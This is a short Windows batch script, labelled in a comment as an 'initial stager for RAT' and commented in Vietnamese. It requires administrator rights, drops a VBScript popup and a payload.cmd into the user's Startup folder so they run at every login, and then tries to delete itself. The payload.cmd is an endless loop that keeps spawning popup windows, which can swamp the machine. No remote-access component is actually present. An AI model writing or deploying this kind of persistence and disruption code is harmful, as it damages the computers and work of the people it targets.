@echo off

REM initial stager for RAT
REM created by

REM Kiểm tra quyền quản trị viên
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Vui long chay script voi quyen quan tri vien!
    pause
    exit /b
)

REM Chuyển đến thư mục Startup
cd /d "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
if %errorlevel% neq 0 (
    echo Khong the truy cap thu muc Startup!
    pause
    exit /b
)

REM Tạo tệp popup.vbs
echo MsgBox "LINE 1" ^& vbCrLf ^& "LINE 2", 262192, "TITLE" > popup.vbs

REM Tạo tệp payload.cmd
(
    echo @echo off
    echo :loop
    echo start /min cmd /c "popup.vbs"
    echo goto loop
) > payload.cmd

REM Kiểm tra xem các tệp đã được tạo chưa
if not exist "popup.vbs" (
    echo Khong the tao popup.vbs!
    pause
    exit /b
)
if not exist "payload.cmd" (
    echo Khong the tao payload.cmd!
    pause
    exit /b
)

REM Tự xóa script sau khi hoàn thành
(
    echo timeout /t 1 /nobreak ^>nul
    echo del /f /q "%~f0"
) | cmd

exit /b